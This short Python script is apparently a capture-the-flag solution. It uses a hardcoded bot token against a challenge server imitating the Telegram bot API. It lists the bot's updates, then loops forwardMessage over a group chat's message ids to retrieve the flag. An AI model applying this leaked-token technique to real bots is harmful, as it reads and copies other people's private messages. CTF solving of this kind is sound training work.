import requests

def make_request(command, params=None):
    bot_token = "1337991337:AESCKk9bSy2kdtu-Ig7wYkzWkjltctu-UkN"
    url = "http://challs.dvc.tf:1101/bot"
    content = requests.get(url + bot_token + '/' + command, params=params).json()
    return content

print(make_request('getMe'))

# The bot's username is sc4mm3r_bot, let's open a chat with him and in order to get a chat id

updates = make_request('getUpdates')
print(updates)
"""
for result in updates['result']:
    # I am the creator of this challenge, my username is jsbdihwirbjebsjh
    if result['message']['from']['username'] == 'jsbdihwirbjebsjh':
        chat_id = result['message']['chat']['id']

for i in range(2, 52):
    params = {'from_chat_id': -1001324431100, 'chat_id': chat_id, 'message_id': i}
    print(params)
    print(make_request('forwardMessage', params=params))

# And we get the flag :)
"""
